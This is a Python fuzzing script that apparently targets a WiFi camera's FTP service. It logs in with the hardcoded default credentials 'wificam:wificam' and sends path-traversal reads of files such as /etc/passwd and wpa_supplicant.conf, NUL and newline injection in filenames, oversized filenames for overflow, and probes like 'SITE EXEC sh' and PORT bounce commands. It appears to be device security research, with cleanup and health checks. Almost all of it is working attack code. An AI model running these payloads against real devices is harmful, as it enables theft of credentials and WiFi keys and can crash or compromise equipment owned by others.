#!/usr/bin/env python3
"""FTP attack-surface fuzz — path traversal, command injection, overflow
attempts against the camera's stripped FTP daemon (`wificam:wificam`
on port 21).

Strategy:
  1. PATH TRAVERSAL via STOR + RETR — try to write/read outside the
     FAT root (which is presumably the chroot)
  2. PATH NORMALIZATION via STOR/RETR with `..`, `//`, `./` mixed in
  3. LONG FILENAMES (1KB, 8KB) — buffer overflow in the FTP parser
  4. NULL/CONTROL CHARS injection in filenames
  5. DOUBLE-PATH (specifying absolute paths from outside FAT)
  6. SYMLINK trickery — STOR a symlink-shaped file then RETR through it
  7. PORT/PASV abuse — could the camera be tricked into connecting to
     arbitrary IPs (FXP attack)?
  8. ABOR / NOOP / REIN / SITE / HELP / STAT — any "stripped" cmds
     that actually do something on edge-case input

All tests are READ-ONLY where possible. STOR tests upload a
recognizable sentinel + clean up after themselves. We don't try to
RMD/DELE anything pre-existing.

If any test produces:
  - A response code we haven't seen (anything other than 200, 226,
    227, 230, 250, 425, 426, 450, 500, 501, 530, 550)
  - A file that lands at an unexpected location
  - A crash (FTP service stops responding)
  - A response that includes data from outside the chroot
…that's a hit.
"""
from __future__ import annotations
import ftplib, io, socket, time

HOST = '192.168.1.1'
USER = 'wificam'
PASS = 'wificam'

SENTINEL = b'FTP_TRAVERSAL_FUZZ_SENTINEL_LARKFLY_2026\n'

# Filenames worth probing
PATH_PAYLOADS = [
    # Path traversal — try to escape FAT root
    '../FACTORY.RUN',
    '../../FACTORY.RUN',
    '../../../FACTORY.RUN',
    '../../../../etc/passwd',
    '../../../../proc/cmdline',
    '../../../../proc/self/maps',
    '/etc/passwd',
    '//etc//passwd',
    '/proc/cmdline',
    # Normalization bugs
    './SENTINEL.TXT',
    '/JPG/../SENTINEL.TXT',
    '/JPG/../../SENTINEL.TXT',
    '/./SENTINEL.TXT',
    '//SENTINEL.TXT',
    '/SENTINEL.TXT',
    'SENTINEL.TXT/',
    # Windows-style separators
    '..\\FACTORY.RUN',
    'JPG\\..\\SENTINEL.TXT',
    # NUL / control char injection
    'SENT\x00JUNK.TXT',
    'SENT\nFOO.TXT',
    'SENT\rFOO.TXT',
    'SENT\tFOO.TXT',
    # Length tests
    'A' * 200 + '.TXT',
    'A' * 500 + '.TXT',
    'A' * 1000 + '.TXT',
    'A' * 4096 + '.TXT',
    'A' * 8192 + '.TXT',
    # Special filenames
    '.',
    '..',
    'CON',
    'NUL',
    'PRN',
    'AUX',
    # Hidden file syntax
    '.hidden',
    '..twodot',
    # Absolute paths
    '/SENTINEL.TXT',
    '/JPG/SENTINEL.TXT',
    '/VIDEO/SENTINEL.TXT',
    # Probe specific paths that might exist
    '/usr/bin/sh',
    '/bin/sh',
    '/proc/mounts',
    '/sys/class/net/wlan0/address',
]

RETR_PAYLOADS = [
    # Try to read files outside the chroot
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '/etc/passwd',
    '//etc/passwd',
    '/etc/hostname',
    '/etc/hosts',
    '/etc/wpa_supplicant.conf',
    '/etc/wpa_supplicant/wpa_supplicant.conf',
    '/proc/cmdline',
    '/proc/version',
    '/proc/mounts',
    '/proc/self/maps',
    '/proc/self/status',
    '/sys/class/net/wlan0/address',
    '/sys/class/net/eth0/address',
    '/sys/devices/system/cpu/cpu0/uevent',
    '/var/log/messages',
    '/var/log/syslog',
    '/HOSTAPD/hostapd.conf',
    '/HOSTAPD/_BACKDOOR.CONF',
    '/etc/hostapd/hostapd.conf',
    # Normalize abuse
    'JPG/../FACTORY.RUN',
    'JPG/./FACTORY.RUN',
    '/./FACTORY.RUN',
    '//FACTORY.RUN',
]

CMDS_TO_PROBE = [
    'NOOP',
    'STAT',
    'SYST',
    'PWD',
    'CDUP',
    'REIN',
    'ABOR',
    'HELP',
    'HELP STOR',
    'FEAT',
    'CLNT MyClient/1.0',
    'OPTS UTF8 ON',
    'XPWD',
    'XMKD foo',
    'XRMD foo',
    'MDTM FACTORY.RUN',
    'SIZE FACTORY.RUN',
    'TYPE A',
    'STRU F',
    'MODE S',
    'ALLO 100',
    'SMNT /',
    'ACCT root',
    'REST 100',
    'PASV',
    'EPSV',
    'EPRT |1|127.0.0.1|21|',
    'PORT 127,0,0,1,0,21',
    'PORT 1,2,3,4,5,6',
    'SITE',
    'SITE HELP',
    'SITE EXEC sh',
    'SITE WIFI',
    'SITE CHMOD 777 FACTORY.RUN',
]


def health_check() -> tuple[bool, str]:
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, 21, timeout=5)
        ftp.login(USER, PASS)
        ftp.voidcmd('SYST')
        ftp.quit()
        return True, 'OK'
    except Exception as e:
        return False, f'{type(e).__name__}: {str(e)[:80]}'


def safe_cmd(ftp, cmd, payload=None):
    """Try one command; return tuple (response, exception?)."""
    try:
        if payload is not None:
            resp = ftp.sendcmd(f'{cmd} {payload}')
        else:
            resp = ftp.sendcmd(cmd)
        return resp, None
    except ftplib.error_perm as e:
        return None, ('perm', str(e))
    except ftplib.error_temp as e:
        return None, ('temp', str(e))
    except (ftplib.error_reply, ftplib.error_proto) as e:
        return None, ('proto', str(e))
    except (socket.timeout, OSError) as e:
        return None, ('net', f'{type(e).__name__}: {e}')
    except Exception as e:
        return None, ('other', f'{type(e).__name__}: {str(e)[:80]}')


def try_stor(ftp, filename: str, data: bytes = SENTINEL) -> dict:
    out = {'filename': filename, 'sentinel_bytes': len(data)}
    try:
        ftp.storbinary(f'STOR {filename}', io.BytesIO(data))
        out['stor'] = 'accepted'
    except ftplib.error_perm as e:
        out['stor'] = f'perm:{e}'
        return out
    except (socket.timeout, OSError) as e:
        out['stor'] = f'net:{type(e).__name__}'
        return out
    except Exception as e:
        out['stor'] = f'exc:{type(e).__name__}: {str(e)[:60]}'
        return out

    # Where did it land? Check via LIST + try to RETR from a few paths
    # Try retrieving it back from the original path
    try:
        buf = io.BytesIO()
        ftp.retrbinary(f'RETR {filename}', buf.write)
        out['rb_orig'] = 'ok' if buf.getvalue() == data else f'mismatch ({len(buf.getvalue())} B)'
    except Exception as e:
        out['rb_orig'] = f'fail:{type(e).__name__}'

    # Also try a normalized version
    norm = filename.replace('..', '').replace('//', '/').lstrip('/').lstrip('.').lstrip('/')
    if norm and norm != filename:
        try:
            buf = io.BytesIO()
            ftp.retrbinary(f'RETR /{norm}', buf.write)
            if buf.getvalue() == data:
                out['rb_normalized'] = f'/{norm} (= sentinel!)'
        except Exception:
            pass

    # cleanup
    for try_path in [filename, norm, '/' + (norm or ''), filename.lstrip('/')]:
        if not try_path:
            continue
        try:
            ftp.delete(try_path)
            out['deleted_via'] = try_path
            break
        except Exception:
            continue
    return out


def try_retr(ftp, path: str) -> dict:
    out = {'path': path}
    buf = io.BytesIO()
    try:
        ftp.retrbinary(f'RETR {path}', buf.write)
        out['result'] = f'★ GOT {len(buf.getvalue())} BYTES'
        out['first_120'] = buf.getvalue()[:120]
    except ftplib.error_perm as e:
        out['result'] = f'perm:{str(e)[:60]}'
    except Exception as e:
        out['result'] = f'{type(e).__name__}'
    return out


def main():
    ok, diag = health_check()
    print(f"[*] FTP baseline: {'OK' if ok else 'FAIL'} ({diag})")
    if not ok:
        return 1

    # Snapshot initial LIST so we can diff
    ftp = ftplib.FTP(); ftp.connect(HOST, 21); ftp.login(USER, PASS)
    initial_lines = []
    ftp.retrlines('LIST', initial_lines.append)
    initial_names = {ln.split()[-1] for ln in initial_lines}
    print(f"[*] FTP root has {len(initial_lines)} entries pre-fuzz")
    print()

    # PART A: probe odd commands
    print("=== A. Command probe — undocumented FTP verbs ===")
    for cmd in CMDS_TO_PROBE:
        resp, err = safe_cmd(ftp, cmd)
        if resp:
            print(f"  ★ {cmd:35s} → {resp[:80]}")
        else:
            etype, emsg = err
            if etype not in ('perm',):  # 500/501/502 perm is the boring case
                print(f"  ! {cmd:35s} → {etype}: {emsg[:80]}")
    ftp.quit()
    print()

    # PART B: RETR path-traversal attempts
    print("=== B. RETR path-traversal — try to read files outside chroot ===")
    ftp = ftplib.FTP(); ftp.connect(HOST, 21); ftp.login(USER, PASS)
    for path in RETR_PAYLOADS:
        result = try_retr(ftp, path)
        if 'GOT' in result['result']:
            print(f"  ★★★ {path!r:55s} → {result['result']}")
            print(f"       first 120B: {result['first_120']!r}")
        # else: silent (perm) — the common case
    ftp.quit()
    print("  (silent rows above = 550 perm; that's the boring case)\n")

    # PART C: STOR with weird filenames
    print("=== C. STOR with traversal / normalization / overflow filenames ===")
    ftp = ftplib.FTP(); ftp.connect(HOST, 21); ftp.login(USER, PASS)
    hits = 0
    for path in PATH_PAYLOADS:
        result = try_stor(ftp, path)
        interesting = (result.get('stor') == 'accepted' and
                       'ok' in (result.get('rb_orig') or '') or
                       'sentinel' in str(result))
        if result.get('stor') == 'accepted':
            print(f"  ★ {repr(path)[:55]:55s} stor=accepted rb={result.get('rb_orig')} {result.get('rb_normalized','')}")
            hits += 1
        # silent rows = STOR was rejected
    ftp.quit()
    print(f"  ({hits} STORs accepted; silent rows rejected)\n")

    # PART D: differential LIST — did any of our uploads survive?
    print("=== D. Post-fuzz LIST diff ===")
    ftp = ftplib.FTP(); ftp.connect(HOST, 21); ftp.login(USER, PASS)
    post_lines = []
    ftp.retrlines('LIST', post_lines.append)
    post_names = {ln.split()[-1] for ln in post_lines}
    new_files = post_names - initial_names
    gone_files = initial_names - post_names
    print(f"  pre: {len(initial_names)}, post: {len(post_names)}")
    if new_files:
        print(f"  NEW (left behind by fuzz — DELETE THESE):")
        for n in sorted(new_files):
            print(f"    {n}")
        # try to clean up
        for n in new_files:
            try:
                ftp.delete(n)
                print(f"    ✓ deleted {n}")
            except Exception as e:
                print(f"    ✗ {n}: {e}")
    if gone_files:
        print(f"  ! MISSING (fuzz removed something — BAD):")
        for n in sorted(gone_files):
            print(f"    {n}")
    if not new_files and not gone_files:
        print("  ✓ root unchanged, no debris.")
    ftp.quit()

    # Final health check
    ok, diag = health_check()
    print(f"\n[*] Final FTP health: {'OK' if ok else 'FAIL'} ({diag})")
    return 0


if __name__ == '__main__':
    import sys
    sys.exit(main())
